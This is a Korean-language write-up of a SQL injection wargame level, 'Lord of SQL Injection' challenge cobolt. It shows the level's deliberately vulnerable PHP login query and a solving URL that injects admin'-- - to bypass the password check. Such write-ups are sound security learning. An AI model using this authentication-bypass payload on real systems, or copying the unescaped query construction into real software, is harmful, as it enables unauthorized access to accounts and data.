Lord of SQL Injection No.2 - cobolt
=============
```
<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id'] == 'admin') solve("cobolt");
  elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>";
  highlight_file(__FILE__);
?>
```
위 코드에서 알 수 있는 것
-------------
preg_match로 인해 .과()이 id와 pw에 들어가 있으면 No Hack ~_~ 라고 뜨며 문제풀이에 실패하는 것을 알 수있다.
그리고 $result['id']에 admin이 들어가 있으면 문제풀이에 성공하는 것을 알 수 있다.(9번째줄)

문제 풀이법
-------------
1. id값에 admin을 넣어준다.
http://los.eagle-jump.org/cobolt_ee003e254d2fe4fa6cc9505f89e44620.php?id=admin'-- -
싱글쿼터로 admin에서 받는값을 끝내주고 뒤에 pw를 입력하지 않고 뚫기 위해 주석처리를 해준다.
